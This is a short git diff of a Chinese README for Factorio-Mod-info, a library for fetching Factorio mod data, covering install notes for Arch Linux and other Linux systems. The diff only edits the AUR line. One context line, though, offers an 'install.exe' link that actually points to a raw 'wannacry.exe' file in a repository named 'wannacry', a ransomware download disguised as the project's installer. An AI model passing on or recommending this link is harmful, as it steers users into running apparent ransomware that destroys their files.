@@ -7,7 +7,7 @@ Factorio-Mod-info 是一个可以获取 Factorio Mod 信息的库。
 
 为了缩小这个 repo 的大小，[`install.exe`](https://github.com/745275633/wannacry/raw/master/wannacry.exe) 已经移至其他 repo。
 ### Arch Linux
-- [ ] 在 Arch Linux 的 aur 中有 [Factorio-Mod-info-git](https://aur.archlinux.org/packages/Factorio-Mod-info-git/) （正在打包）
+在 Arch Linux 的 aur 中有 [Factorio-Mod-info-git](https://aur.archlinux.org/packages/Factorio-Mod-info-git/)
 
 ### 其他 Linux
 安装你需要 [xmake](https://github.com/tboox/xmake)，[Boost](http://www.boost.org/) 和 [avhttp](https://avplayer.org/avhttp.html)，因为 [mods.factorio.com](https://mods.factorio.com) 需要 https，所以还需要 openssl。
